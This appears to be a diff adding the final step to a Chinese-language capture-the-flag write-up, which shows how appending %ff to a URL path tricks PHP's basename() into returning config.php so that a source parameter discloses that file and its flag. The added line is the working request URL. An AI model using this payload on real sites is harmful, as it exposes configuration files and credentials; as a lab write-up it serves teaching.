@@ -60,4 +60,6 @@ $var2="/config.php/%ff"
 basename($var2)	=>	config.php
 ```
 接下来就显然了，通过构造URI让其包含`config.php`这个文件名再让`basename`函数截取出来，之后通过请求参数`source`就能显示`config.php`的源码，也就能见到`flag`了。
-
+```
+/index.php/config.php/%ff?source
+```
